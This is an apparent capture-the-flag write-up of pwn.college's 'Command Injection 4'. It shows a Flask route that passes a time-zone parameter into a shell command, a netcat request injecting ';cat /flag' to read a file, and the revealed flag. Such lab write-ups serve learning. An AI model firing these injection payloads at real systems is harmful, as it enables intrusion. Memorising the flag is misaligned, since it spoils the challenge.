---
layout: page
title: "Command Injection 4 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

In this challenge, we are provided with a Python Flask web server that includes a route `/milestone`. It allows users to supply a `time-zone` parameter, which is directly interpolated into a shell command. This introduces a **command injection vulnerability**.

### 🔍 Source Code
```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/milestone", methods=["GET"])
def challenge():
    arg = flask.request.args.get("time-zone", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/milestone"><input type=text name=time-zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
---

## 🧨 Vulnerability

The `time-zone` input is passed directly to a shell command using `shell=True`:

```python
command = f"TZ={arg} date"
```

This allows the user to inject additional shell commands using characters like `;`.

---

## 🚀 Exploit

We inject a command to read the `/flag` file by terminating the original command with `;` and chaining `cat /flag`.

We send the following malicious request using `netcat`:

```bash
printf 'GET /milestone?time-zone=UTC;cat+/flag+%%23 HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n' | nc challenge.localhost 80
```

- `UTC;cat+/flag+%23` → `%23` is the URL-encoded `#`, which is used to comment out the rest of the line (to avoid errors from trailing `date`).
- `cat+/flag` → Reads the flag.
- The result will include the output of the `cat /flag` command.
---

## 🏁 Flag

The response includes the flag inside the `<pre>` tag:

```
pwn.college{cz5Lo7gaOZPd-wP7z3JqIhPGNUX.QX4gzMzwSM0IzMyEzW}
```
---
